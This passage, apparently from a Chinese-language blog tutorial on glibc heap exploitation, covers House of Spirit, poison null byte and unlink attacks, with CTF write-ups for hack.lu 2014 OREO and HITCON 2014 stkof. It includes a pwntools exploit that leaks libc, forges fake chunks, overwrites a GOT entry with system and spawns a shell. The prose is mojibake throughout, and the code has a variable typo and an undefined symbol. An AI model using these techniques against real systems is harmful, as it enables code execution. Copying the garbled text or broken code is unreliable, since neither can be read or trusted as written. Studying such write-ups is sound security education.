ä¸­ã€‚</p><p>å½“æˆ‘ä»¬å†æ¬¡ç”³è¯·ç›¸åŒå¤§å°çš„å †å—æ—¶ï¼Œç¨‹åºå°±ä¼šæŠŠè¿™å—å†…å­˜è¿”å›ç»™æˆ‘ä»¬ï¼Œæˆ‘ä»¬å°±å®ç°äº†å¯¹è¿™å—åœ°å€çš„ä»»æ„å†™æ“ä½œã€‚</p><blockquote><p>å¯¹äºfakechunkçš„æ„é€ ï¼Œæœ‰ä»¥ä¸‹å‡ ç‚¹éœ€è¦æ³¨æ„ï¼š</p><ul><li><code>IS_MMAPPED</code> ä½å’Œ <code>NON_MAIN_ARENA</code> ä½éƒ½è¦ä¸ºé›¶</li><li>å¤§å°è¦åœ¨ 32~128 å­—èŠ‚ä¹‹é—´</li></ul></blockquote><h3 id="ğŸ—¡ï¸çœŸé¢˜å®æˆ˜-hack-lu-CTF-2014-OREO"><a href="#ğŸ—¡ï¸çœŸé¢˜å®æˆ˜-hack-lu-CTF-2014-OREO" class="headerlink" title="ğŸ—¡ï¸çœŸé¢˜å®æˆ˜ hack.lu CTF 2014-OREO"></a>ğŸ—¡ï¸çœŸé¢˜å®æˆ˜ hack.lu CTF 2014-OREO</h3><p><a href="https://github.com/ctf-wiki/ctf-challenges/blob/master/pwn/heap/fastbin-attack/2014_hack.lu_oreo/oreo">è·å–é¢˜ç›®ç‚¹è¿™é‡Œï¼</a></p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/house_of_sprit_checksec.png"></p><p>ç¨‹åºèœå•æ‰€æä¾›çš„åŠŸèƒ½ï¼Œåˆ†åˆ«å¯¹åº”ï¼š</p><ul><li><code>add new rifle</code> ï¼šmalloc ä¸€ä¸ªæ–°çš„å †å—</li><li><code>show added rifle</code> ï¼šè¾“å‡ºå †å—å­˜å‚¨çš„ä¿¡æ¯</li><li><code>order selected rifle</code> ï¼šfree æ‰åœ¨æ­¤ä¹‹å‰çš„æ‰€æœ‰å †å—</li><li><code>leave a message</code>ï¼šæ ¹æ® bss æ®µä¸Šè®°å½•çš„ä¸€ä¸ªåœ°å€ï¼Œå‘è¿™ä¸ªåœ°å€è¿›è¡Œå†™å…¥æ“ä½œã€‚</li></ul><h5 id="æ³„éœ²åŸºåœ°å€"><a href="#æ³„éœ²åŸºåœ°å€" class="headerlink" title="æ³„éœ²åŸºåœ°å€"></a>æ³„éœ²åŸºåœ°å€</h5><p>æˆ‘ä»¬åœ¨ <code>add new rifle</code> åŠŸèƒ½å‡½æ•°ä¸­å¯ä»¥çœ‹å‡ºç”¨äºå­˜å‚¨ rifle çš„ç»“æ„ä½“å¤§è‡´æ˜¯å¦‚ä¸‹çš„ç»“æ„ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br>    <span class="hljs-type">char</span> description[<span class="hljs-number">26</span>];<br>    <span class="hljs-type">char</span> name[<span class="hljs-number">26</span>];<br>    node *prev;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸¤ä¸ªéƒ¨åˆ†éƒ½æ˜¯è¯»å–äº† 56 ä¸ªå­—èŠ‚ï¼Œå¯ä»¥æº¢å‡ºã€‚</p><p>åœ¨ <code>show add refle</code> åŠŸèƒ½å‡½æ•°ä¸­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºï¼Œå‘ç”¨æˆ·è¾“å‡ºä¿¡æ¯æ˜¯æ ¹æ®æ¯ä¸ªç»“ç‚¹çš„æŒ‡é’ˆç»„æˆçš„é“¾çŠ¶ç»“æ„ä¸€ä¸€è®¿é—®ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/orce-show.png"></p><p>æ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸¤ä¸ªå‡½æ•°ï¼Œåœ¨å¡«å†™ description æ—¶ä¿®æ”¹ç¬¬ 13 ä½çš„ <code>prev</code> æŒ‡é’ˆæŒ‡å‘ puts_got ï¼Œå†é€šè¿‡ <code>show add refle</code> æ³„éœ²åœ°å€ï¼Œä»è€Œè®¡ç®—åŸºåœ°å€ã€‚</p><h5 id="House-Of-Spirit"><a href="#House-Of-Spirit" class="headerlink" title="House Of Spirit"></a>House Of Spirit</h5><p>å†å›å¿†ä¸€ä¸‹ä¸‹å®Œæˆ House Of Spirit çš„æ¡ä»¶ï¼š</p><ul><li><code>IS_MMAPPED</code> ä½å’Œ <code>NON_MAIN_ARENA</code> ä½éƒ½è¦ä¸ºé›¶</li><li>å¤§å°åœ¨ <code>2 * SIZE_SZ ~ av-&gt;system_mem</code> ä¹‹é—´</li><li>åœ°å€å¯¹é½</li></ul><p>å†ç»“åˆæœ¬é¢˜æƒ…å†µå®Œæˆå¯¹åº”æ¡ä»¶æ„é€ ï¼š</p><ul><li><p>åœ¨ <code>show current stats</code> åŠŸèƒ½ä¸­ç”¨åˆ°çš„ä¸‰ä¸ªå˜é‡åœ¨ bss æ®µå†™å…¥æ•°æ®ï¼Œå¹¶ä¸”å­˜åœ¨ä¸€ä¸ªæŒ‡é’ˆæŒ‡å‘ <code>0804A2C0</code> ã€‚å¯ä»¥åœ¨æ­¤å¤„æ„é€  fake chunk</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/orce-bss.png"></p></li><li><p>ç»“æ„ä½“å¤§å°æ˜¯ 0x38 å¤§å°ï¼Œæ‰€ä»¥å…¶å¯¹åº”çš„ chunk ä¸º 0x40ã€‚æˆ‘ä»¬åœ¨ fake chunk ä¸­ size éƒ¨åˆ†å¯¹åº”çš„æ˜¯ <code>newNum</code>ï¼Œè€Œè¿™éƒ¨åˆ†å®é™…å­˜å‚¨çš„å†…å®¹æ˜¯æˆ‘ä»¬ <code>add</code> çš„æ¬¡æ•°ï¼Œæˆ‘ä»¬å¯ä»¥æ§åˆ¶å®ƒç­‰äº 0x40 åŒæ—¶ä¿è¯æ ‡å¿—ä½ä¸º 0 ã€‚è€Œç¬¬äºŒä¸ªfake chunkçš„æ•°æ®åŒºåŸŸå°±ä¼šåœ¨å¯ç¼–è¾‘çš„ <code>0804A2C0</code> åŒºåŸŸï¼Œå¯ä»¥ç›´æ¥ä¿®æ”¹</p></li></ul><p>fake chunk</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level=<span class="hljs-string">&#x27;debug&#x27;</span>,arch=<span class="hljs-string">&#x27;i386&#x27;</span>,os=<span class="hljs-string">&#x27;linux&#x27;</span>)<br><br>sh=process(<span class="hljs-string">&#x27;./oreo&#x27;</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./oreo&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">&quot;puts&quot;</span>]<br>puts_got = elf.got[<span class="hljs-string">&quot;puts&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">name,des</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.sendline(name)<br>    sh.sendline(des)<br>    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():<br>    sh.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">order</span>():<br>    sh.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">msg</span>(<span class="hljs-params">notice</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    sh.sendline(notice)<br><br>payload1=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">27</span>+p32(puts_got)<br>add(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">4</span>,payload1)<br>show()<br>sh.recvuntil(<span class="hljs-string">&#x27;Description: &#x27;</span>)<br>puts_adr=u32(sh.recvuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-literal">True</span>)[:<span class="hljs-number">4</span>])<br>libc_base=puts_adr-libc.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>system_adr=libc_base+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>count=<span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> count&lt;<span class="hljs-number">0x40</span>-<span class="hljs-number">1</span>:<br>    add(<span class="hljs-string">&#x27;aaaa&#x27;</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>    count+=<span class="hljs-number">1</span><br>    <br>paload2=<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">27</span>+p32(<span class="hljs-number">0x804a2a8</span>)<br>add(<span class="hljs-string">&#x27;b&#x27;</span>*<span class="hljs-number">4</span>,payload2)<br><br>payload3=<span class="hljs-string">&#x27;\x00&#x27;</span>*(<span class="hljs-number">0x20</span>) + p32(<span class="hljs-number">0x40</span>) + p32(<span class="hljs-number">0x20</span>)<br><span class="hljs-comment">#msgåœ°å€0x0804A2C0-0x0804A2A8=0x18  +8=0x20  </span><br>msg(payload3)<br><br>order()<br>add(<span class="hljs-string">&#x27;a&#x27;</span>,p32(sscanf_got)) <br><span class="hljs-comment">#è¿™æ—¶bssæ®µä¸­å¯å†™çš„msgéƒ¨åˆ†è¢«åˆ†é…å‡ºæ¥ï¼ŒåŒæ—¶ä½œä¸ºdesçš„sscanf_gotçš„åœ°å€è¢«å¡«å……åœ¨msgé¡¶éƒ¨</span><br>msg(p32(system_adr))ã€€ã€€<span class="hljs-comment">#ä¿®æ”¹sscanf_gotçš„å†…å®¹ä¸ºsystem_adr</span><br>sh.sendline(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>)<br>sh.interactive()<br></code></pre></td></tr></table></figure><h1 id="poison-null-byte"><a href="#poison-null-byte" class="headerlink" title="poison_null_byte"></a>poison_null_byte</h1><p>æˆ‘æ„Ÿè§‰è¿™ä¸ªå®é™…ä¸Šå°±æ˜¯ off-by-null </p><p><strong>åŸç†ï¼š</strong>ä¼ªé€ ä¸€ä¸ªfake_chunkï¼Œå¹¶ä¿®æ”¹ç‰©ç†ç›¸é‚»çš„ä¸‹ä¸€ä¸ª chunk çš„ prev_inuse ä½ä¸º 0 ï¼Œå¼•èµ·åˆå¹¶ä¸ unlink ï¼Œæœ€åå†ç”³è¯·çš„æ—¶å€™å°±ä¼šä»è¿™ä¸€å—åˆå¹¶çš„ chunk ä¸­åˆ‡å‰²ï¼Œoverlap è¿™ä¸€å— chunk ã€‚</p><p><strong>çŸ¥è¯†ç‚¹ï¼š</strong></p><ul><li>chunk çš„ size ä½ä½ä¸‰ä½ä¸ºæ ‡å¿—ä½ï¼Œåˆ†åˆ«æ˜¯ <code>NON_MAIN_ARENA</code> ã€<code>IS_MMAPPED</code> ã€<code>PREV_INUSE</code>ã€‚å…¶ä¸­<code>PREV_INUSE</code> è¡¨ç¤ºå‰é¢ä¸€ä¸ªå†…å­˜å—æ˜¯å¦è¢«ä½¿ç”¨ï¼Œ0 è¡¨ç¤ºä¸è¢«ä½¿ç”¨ï¼ˆè¢« freeäº†ï¼‰ï¼Œ1 è¡¨ç¤ºæ­£åœ¨è¢«ä½¿ç”¨ã€‚</li><li>FD-&gt;bk &#x3D;&#x3D; P &amp;&amp; BK-&gt;fd &#x3D;&#x3D; Pã€‚</li></ul><p>åœ¨è¿™é‡Œå®ä¾‹ä¸­æˆ‘ä»¬ç”³è¯·äº†å››ä¸ª chunkï¼ŒæŒ‰ç…§ç”³è¯·é¡ºåºåˆ†åˆ«è®°ä¸º <em>aï¼Œbï¼Œc</em> å’Œä¸€ä¸ªé˜²æ­¢å †å—ä¸ top chunk åˆå¹¶çš„å †å—ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/poison-chunk-all.png"></p><p>æˆ‘ä»¬æƒ³è¦æ„é€ çš„ fake chunk åœ¨ <em>b</em> å¯¹åº”çš„éƒ¨åˆ†ï¼Œéœ€è¦ç”¨åˆ°çš„åªæœ‰ chunk <em>b</em>ï¼Œ<em>c</em> ã€‚æˆ‘ä»¬å°†ä¼šåœ¨ fake b é‡Œç”³è¯·ä¸¤ä¸ªå †å—ï¼Œå…¶ä¸­æƒ³è¦åˆ©ç”¨çš„å †å—è®°ä½œ victimã€‚<strong>é€šå¸¸ victim å…¶ä¸­åŒ…å«æˆ‘ä»¬è¦æ§åˆ¶çš„æœ‰ä»·å€¼çš„æŒ‡é’ˆã€‚</strong></p><p>ç”±æ­¤ï¼Œéœ€è¦åœ¨ <code>b+0x200</code> å¤„ä¼ªé€ ä¸€ä¸ª <code>fake prev_size</code>ï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_fakeprev_size.png"></p><p>ç„¶å free æ‰ <em>b</em>ã€‚</p><p>å‡è®¾æˆ‘ä»¬ç°åœ¨åœ¨ç¼–è¾‘ chunk <em>a</em> çš„æ—¶å€™å­˜åœ¨ off-by-null æ¼æ´ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ç¼–è¾‘ a æ¥æº¢å‡ºåˆ° <em>b</em> size ä½çš„æ ‡å¿—ä½ï¼Œä½¿å¾—å…¶ä» 211 å˜ä¸º 200ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_b_size.png"></p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_b_size2.png"></p><p>è¿™æ—¶å°±å’Œå‰é¢çš„æ“ä½œå¯¹åº”ï¼Œæˆ‘ä»¬ä¿®æ”¹ <em>b</em> çš„å¤§å°ä¸º 0x200ï¼Œé‚£ä¹ˆç¨‹åºå°±ä¼šå» <em>b</em>+0x200 çš„åœ°æ–¹æŸ¥æ‰¾å®ƒçš„ prev_sizeï¼Œè€Œä¸æ˜¯å» <em>c</em> å¯»æ‰¾ã€‚è¿™æ ·æˆ‘ä»¬å°±ç»•è¿‡äº† <code>chunksize(P) = prev_size(next_chunk(P))</code> çš„æ£€æµ‹ã€‚</p><p>æ¥ä¸‹æ¥ç”³è¯·ä¸€ä¸ª 0x100 å¤§å°çš„ chunk <em>b1</em>ï¼Œå› ä¸º <em>b</em> å·²ç»è¢« free äº†ï¼Œæ‰€ä»¥ glibc ä¼šå°† <em>b</em> è¿›è¡Œåˆ‡å‰²ï¼Œåˆ†å‡ºä¸€å— <code>0x100</code> å¤§å°çš„å †å—ç»™ <em>b1</em>ï¼Œå‰©ä¸‹ 0xf0 ã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_b_b1.png"></p><p>è¿™ä¸ªæ—¶å€™æˆ‘ä»¬å†å›åˆ°ä¼ªé€ çš„ 0x200 å¤§å°çš„ <em>fake_b</em> çš„ prev_size ä½å˜æˆäº† 0xf0</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_fakeprev_size2.png"></p><p>æ¥ä¸‹æ¥å†å»ç”³è¯·ä¸€å—å°äº 0xf0 çš„å †å—è®°ä¸º <em>victim</em>ï¼Œè¿™æ ·å°±ä¼šç»§ç»­åˆ†å‰² <em>b</em> å‰©ä¸‹çš„é‚£ä¸€å—</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_malloc_b2.png"></p><p>æ¥ä¸‹æ¥ free æ‰ <em>b1</em> å’Œ <em>c</em></p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_free_b1.png"></p><p>å› ä¸º <em>c</em> çš„ <code>prev_size</code> ä»ä¸ºæ˜¯ <code>0x210</code>ï¼Œæ‰€ä»¥ä¼šä»¥æ­¤å»åˆå¹¶åŸæœ¬çš„ b ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šå°†ä»å½“å‰çš„ b1 åˆ° c å…¨éƒ¨çš„å†…å­˜åŒºåŸŸåˆå¹¶ï¼ŒåŒ…å« <em>victim</em> çš„å†…å­˜åŒºåŸŸã€‚</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/off-by-one_free_c.png"></p><p>ä½†æ˜¯å¯¹äºç¨‹åºè€Œè¨€æˆ‘ä»¬å¹¶æ²¡æœ‰ free <em>victim</em> ã€‚</p><p>æ¥ä¸‹æ¥å†ç”³è¯·ä¸€ä¸ªå¤§çš„å †å—å°±å¯ä»¥å¯¹ victim è¿›è¡Œä»»æ„å†™æ“ä½œå•¦ã€‚</p><h3 id="ğŸ—¡ï¸çœŸé¢˜å®æˆ˜-HITCON-CTF-2014-stkof"><a href="#ğŸ—¡ï¸çœŸé¢˜å®æˆ˜-HITCON-CTF-2014-stkof" class="headerlink" title="ğŸ—¡ï¸çœŸé¢˜å®æˆ˜ HITCON CTF 2014-stkof"></a>ğŸ—¡ï¸çœŸé¢˜å®æˆ˜ HITCON CTF 2014-stkof</h3><p>é¢˜ç›®æ˜¯èœå•é¢˜çš„åŸºæœ¬é€»è¾‘ï¼Œä½†æ˜¯æ²¡æœ‰ä¸ºç”¨æˆ·è¾“å‡ºèœå•æç¤ºã€‚ç›´æ¥æ¥æ”¶ç”¨æˆ·çš„è¾“å…¥ï¼Œå¯é€‰1-4 å®ç°ä¸åŒçš„åŠŸèƒ½ï¼Œä¾æ¬¡åˆ†æå„ä¸ªå‡½æ•°åŸºæœ¬å¯¹åº”ä¸‹é¢çš„åŠŸèƒ½ï¼š</p><ul><li>v3 &#x3D;&#x3D; 1ï¼š<code>malloc(size)</code>ï¼ŒåŒæ—¶è®¡æ•°åŠ ä¸€ï¼Œå †å—æŒ‡é’ˆå­˜å‚¨åœ¨å…¨å±€å˜é‡ s æ•°ç»„ ä¸­ã€‚size ç”±ç”¨æˆ·è¾“å…¥æ¥æ”¶ã€‚</li><li>v3 &#x3D;&#x3D; 2ï¼šè¯»å– n é•¿åº¦çš„å­—ç¬¦ä¸²å­˜å‚¨åœ¨æœ€æ–°çš„å †å—å½“ä¸­ã€‚å…¶ä¸­ n çš„å¤§å°ç”±ç”¨æˆ·è¾“å…¥æ¥æ”¶ï¼Œæ‰€ä»¥å¯ä»¥é€ æˆæº¢å‡ºã€‚</li><li>v3 &#x3D;&#x3D; 3ï¼šfree é€‰ä¸­çš„å †å—ï¼Œå †å—çš„é€‰æ‹©ç”±ç”¨æˆ·è¾“å…¥æ¥æ”¶ã€‚</li><li>v3 &#x3D;&#x3D; 4ï¼šè¯»å– chunk å†…å®¹çš„é•¿åº¦å¹¶æ ¹æ®ä¸åŒæƒ…å†µè¾“å‡ºä¸åŒå†…å®¹ï¼ˆæ²¡å•¥ç”¨å¤„ï¼‰</li></ul><blockquote><p>çœ‹åˆ«çš„å¸ˆå‚…åˆ†äº«çš„æ–‡ç« æ—¶å‘ç°äº†ä»¥å‰æ²¡å…³æ³¨è¿‡çš„å° tips ï¼š</p><p>setbuf() &#x2F; setvbuf() å‡½æ•°ä½œç”¨ï¼šå…³é—­ I&#x2F;O ç¼“å†²åŒº</p><p>ä¸€èˆ¬çš„ç¨‹åºä¸ºäº†è®©ç¨‹åºæ˜¾ç¤ºæ­£å¸¸ï¼Œä¼šåœ¨ä»£ç ä¸­é€šè¿‡ä»¥ä¸‹å‘½ä»¤å…³é—­ I&#x2F;O ç¼“å†²åŒºï¼š</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">&gt;<span class="hljs-built_in">setbuf</span>(stdin ,<span class="hljs-number">0</span>);<br>&gt;<span class="hljs-built_in">setbuf</span>(stdout,<span class="hljs-number">0</span>);<br>&gt;<span class="hljs-built_in">setbuf</span>(stderr,<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><p>æœ¬é¢˜æ²¡æœ‰å…³é—­ç¼“å†²åŒºï¼Œå‡½æ•°è¿è¡Œå¼€å§‹é˜¶æ®µåœ¨ fgets() å‡½æ•°ä»¥åŠ printf() å‡½æ•°è¿è¡Œçš„æ—¶å€™ï¼Œä¼š malloc() ä¸¤å—å†…å­˜åŒºåŸŸã€‚</p></blockquote><p>s æ˜¯ä¸€ä¸ªå­˜å‚¨åœ¨ .bss æ®µçš„æŒ‡é’ˆï¼Œè¿™ç§æŒ‡é’ˆå°±æ˜¯è¿™ç±» unlink é¢˜ç›®çš„ç‰¹å¾</p><p><img src="D:/ç¬”è®°/PWN/how2heap/stkof_s.png"></p><p>é€šç”¨åšé¢˜æµç¨‹ï¼š</p><p>è®¾æŸä¸€å †å—çš„æŒ‡é’ˆå­˜å‚¨åœ¨ <code>pchunk</code> åœ°å€å¤„ï¼Œåœ¨è¯¥å †å—ä¸­ä¼ªé€ å †å—ï¼Œå¡«å……æ•°æ®ä¼ªé€ å †å¤´ï¼Œåˆ©ç”¨å¡«å……å †å—å†…å®¹çš„å‡½æ•°å°†è¯¥å †å—çš„ <em>fd</em> å’Œ <em>bk</em> å¤„åˆ†åˆ«ä¿®æ”¹ä¸º <code>pchunk-0x18</code>ï¼Œ<code>pchunk-0x10</code>ï¼Œç„¶åå°†ç›¸é‚»çš„ä¸‹ä¸€å †å—çš„ <em>priv_size</em> ä¿®æ”¹ä¸ºä¼ªé€ çš„å †å—çš„å¤§å°ï¼Œå †å¤´ <em>size</em> ä¿®æ”¹ä¸ºç›¸åº”çš„å¤§å°ï¼Œç„¶åé‡Šæ”¾ç›¸é‚»å †å—ï¼ˆå¤§å°éœ€ä¸ºé fastbin ï¼‰å°±å¯ä»¥è§¦å‘ unlink ï¼Œå°†è¯¥å †å—çš„æŒ‡é’ˆä¿®æ”¹ä¸º <code>pchunk-0x18</code> äº†ã€‚</p><p>å…ˆæŠŠå‡½æ•°å†™äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">malloc</span>(<span class="hljs-params">size</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>(<span class="hljs-params">idx, size, content</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx))<br>    sh.sendline(<span class="hljs-built_in">str</span>(size))<br>    sh.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">idx</span>):<br>    sh.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    sh.sendline(<span class="hljs-built_in">str</span>(idx))<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬ç”³è¯·ä¸‰ä¸ªå—ï¼Œç¬¬ä¸€ä¸ªç”¨ä¸é˜²æ­¢å †å—ä¸ top chunk åˆå¹¶ï¼Œç¬¬äºŒä¸ªç”¨æ¥ä¼ªé€  fake chunk ï¼Œç¬¬ä¸‰ä¸ªç”¨æ¥ free é€ æˆ unlink ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x100</span>)<br>add(<span class="hljs-number">0x20</span>)<br>add(<span class="hljs-number">0x80</span>)<br></code></pre></td></tr></table></figure><p>ç”³è¯·ä¹‹åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°åœ¨ .bss æ®µå°±å­˜å‚¨ç€æ–°ç”³è¯·çš„å †å—çš„ä¿¡æ¯</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/stkof_s_inf.png"></p><p>å› ä¸ºæˆ‘ä»¬è¦åœ¨ chunk 2 å¤„ä¼ªé€  fake chunkï¼Œç„¶å free chunk 3 ï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æŠŠå­˜æ”¾ chunk 2 åœ°å€çš„åœ°æ–¹ï¼Œå³0x602150 è®¾ä¸º ptrï¼Œç„¶åè¿›è¡Œ fake chunk çš„æ„é€ ä»¥åŠæº¢å‡ºæ•°æ®çš„å†™å…¥ã€‚</p><p>ç°åœ¨ç¬¬äºŒä¸ªå’Œç¬¬ä¸‰ä¸ª chunk ä¸­çš„ä¿¡æ¯å¦‚ä¸‹ï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/stkof_chunk22.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">ptr=<span class="hljs-number">0x602150</span> <br>payload=p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x21</span>)+p64(ptr-<span class="hljs-number">0x18</span>)+p64(ptr-<span class="hljs-number">0x10</span>)+p64(<span class="hljs-number">0x20</span>)+p64(<span class="hljs-number">0x90</span>)<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œå®Œè¿™éƒ¨åˆ†çš„ä»£ç åç»“æ„ä¼šå˜æˆä¸‹é¢è¿™æ ·ï¼š</p><p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/stkof_chunk2.png"></p><p>è¿™æ—¶ chunk3 çš„ prev_inuse ä½è¢«ç½®ä¸º0ï¼Œè¡¨ç¤ºå‰ä¸€ä¸ª chunk ä¸ºç©ºé—²çŠ¶æ€ï¼Œprev_size ä¹Ÿè¢«æ”¹ä¸ºäº†å¯¹åº” fake chunk çš„å¤§å°ã€‚è¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥ free chunk3 äº†</p><p>å½“æˆ‘ä»¬ free chunk3 æ—¶ï¼Œç³»ç»Ÿåˆ¤æ–­å‰ä¸€ä¸ª chunk æ˜¯å¦å¤„äºç©ºé—²çŠ¶æ€ï¼Œæˆ‘ä»¬ä¸Šé¢å·²ç»é€šè¿‡å 